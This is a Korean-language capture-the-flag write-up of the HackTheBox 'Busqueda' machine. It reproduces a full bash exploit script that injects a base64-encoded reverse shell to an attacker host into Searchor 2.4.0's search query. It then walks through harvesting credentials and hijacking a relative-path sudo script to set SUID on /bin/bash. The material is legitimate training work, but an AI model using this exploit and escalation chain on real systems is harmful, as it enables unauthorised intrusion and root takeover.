# HTB-BUSQUEDA
```bash
OS: Linux
DATE: 26.08.29
DIFFICULTY: Easy
```

## RECON
**nmap** 간단한 포트 검색 결과 22(ssh), 80(http) 서비스가 실행 중이었다.
```bash
nmap -sC -sV IP
```
버전 등 상세 정보를 확인한 후 http가 searcher.htb라는 도메인으로 실행 중인 것을 알게 되어 도메인을 추가해주었다.
```bash
sudo nano /etc/hosts
```

## Initial Access
가장 먼저 웹사이트에 접근하였다. 웹페이지에서 가장 눈에 띈 것은 'Powered by **Flask** and **Searchor 2.4.0**'이라는 문구였다. 대상 시스템이 Searchor 2.4.0이라는 버전을 사용 중인 것을 알게 된 후 exploit을 검색해보았다. CVE는 발견하지 못했고, 대상 시스템 전용 CMD-injection PoC를 발견할 수 있었다.
```bash
#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"

if [ -z "${evil_cmd##*$plus*}" ]
then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
else 
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: 

./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
```
따라서 9001 포트를 리스닝 상태로 만들고 대상 PoC 코드를 실행하였다.
```bash
rlwrap nc -nlvp 9001
./poc.sh http://TARGET TUN0_IP 9001
```
이를 통해 초기 쉘을 얻을 수 있었다.

![user](attach_real/Pasted%20image%2020260829220620.png)

## Privilege Escalation
초기 접근 이후 `sudo -l`을 실행해보았지만 비밀번호가 필요했고, SUID·crontab 등을 확인해보았지만 별다른 취약점은 없었다. `netstat`을 확인해본 결과 로컬에서 많은 포트가 활동 중이어서 SSH 터널링을 생각해 대상 쉘에 `ssh-keygen`을 활용하여 키를 넣었다.
```bash
ssh-keygen -t rsa -f /tmp/busqueda 
```
하지만 터널링으로 할 수 있는 것은 없었고, 대상 쉘 디렉토리를 더 뒤져보았다. `/var/www/app`이라는 디렉토리에서 `ls -al`을 통해 숨김 파일을 본 순간 `.git`이라는 폴더가 있었다. 들어가보니 cody라는 유저의 크레덴셜 및 gitea.searcher.htb라는 서브도메인도 있었다. 서브도메인을 도메인에 입력한 후 접속해보았다.
```bash
sudo nano /etc/hosts
```
서브도메인 안에는 gitea가 실행 중이었고, cody라는 사용자 크레덴셜로 로그인한 결과 별다른 중요 정보는 없었다.

이후 cody 사용자의 비밀번호로 `sudo -l`을 시도해본 결과 성공하였다. NOPASSWD로 실행 중인 프로그램은 `/opt/scripts/system-checkup.py`였다. 대상 프로그램을 실행해본 결과 옵션이 세 가지 있었다.
- docker-ps
- docker-inspect
- full-checkup

처음 docker-ps로 시도해보니 docker image 정보들이 담겨 있었고, 그중 mysql_db라는 시스템이 있었다. 이후 docker-inspect 옵션으로 시도해본 결과 `<format> <container_name>`이라는 인자가 있어 구글에 검색해본 결과, inspect의 format은 json 문법으로 실행할 수 있다는 것을 알게 되어 모든 정보를 출력하는 `'{{json .}}'`을 실행하였다.
```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db
```
실행 결과 gitea의 평문 비밀번호 등이 담겨 있었다. 이를 통해 mysql db에 접속한 결과 admin 유저의 해시 비밀번호 등이 있었지만 별다른 이득은 없었다. 새로 얻은 비밀번호로 gitea 사이트에서 administrator로 접속하는 데 성공하였다. gitea에는 Administrator라는 유저가 `/opt/scripts/system-checkup.py` 스크립트 코드를 작성한 폴더가 있었다. `system-checkup.py`라는 스크립트에는
```python
elif action == 'full-checkup':
    try:
        subprocess.run(['./full-checkup.sh'], shell=False, ...)
        print("Done.")
    except:
        print("Something went wrong")
```
라는 부분이 있었다. 상대경로로 `./full-checkup.sh`가 실행되는 것을 알게 되어, 현재 작업 디렉토리에 동일한 이름의 `full-checkup.sh` 파일을 만들면 대상 시스템을 속일 수 있다는 것을 알게 되었다. 그래서 `/tmp` 디렉토리에서 `full-checkup.sh`에 간단한 쉘 페이로드를 작성하였다.
```bash
cat < full-checkup.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
```
```bash
chmod +x full-checkup.sh
```
```bash
sudo python3 /opt/scripts/system-checkup.py full-checkup
```
을 실행하였다. 이후 권한 상승을 위해 `/bin/bash -p`를 사용하여 root 쉘을 얻을 수 있었다.

**`/bin/bash -p`**: SUID가 걸린 파일은 소유자 권한으로 실행되는데, bash 자체의 SUID 비트만으로는 유효 UID가 적용되지 않으므로 `-p` 옵션을 사용해야 한다.

![root](attach_real/Pasted%20image%2020260829232735.png)

## New Inform 
- ls -al습관을 항상 들어놓자.
- docker 활용법을 알게 되었다.
- script항상 취약점이 있다고 생각하자.